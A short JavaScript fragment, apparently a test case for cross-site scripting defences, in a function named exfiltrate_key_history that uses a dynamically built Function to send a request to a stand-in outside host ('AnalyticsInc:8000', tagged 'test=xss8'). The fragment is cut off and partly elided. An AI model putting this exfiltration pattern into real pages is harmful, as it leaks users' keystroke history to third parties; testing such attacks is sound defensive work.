function exfiltrate_key_history() {
  ...
  script.src = "";
  var v0 = script;
  var v4 = JAMScript.call(Function, null, ['xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss8",true);xmlhttp.send(null);']);
